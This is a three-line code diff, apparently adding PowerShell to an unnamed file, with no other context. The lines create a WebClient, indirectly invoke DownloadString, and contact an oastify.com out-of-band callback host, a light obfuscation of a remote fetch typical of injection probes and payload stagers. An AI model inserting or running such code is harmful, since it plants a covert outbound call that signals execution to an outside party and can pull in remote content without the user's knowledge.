@@ -1,0 +1,3 @@
+$x = (New-Object Net.WebClient);
+$y=$x.DownloadString;
+$y.Invoke('http://cl1vp6wsn9fuxgkjjwaj8atid9j27wvl.oastify.com')
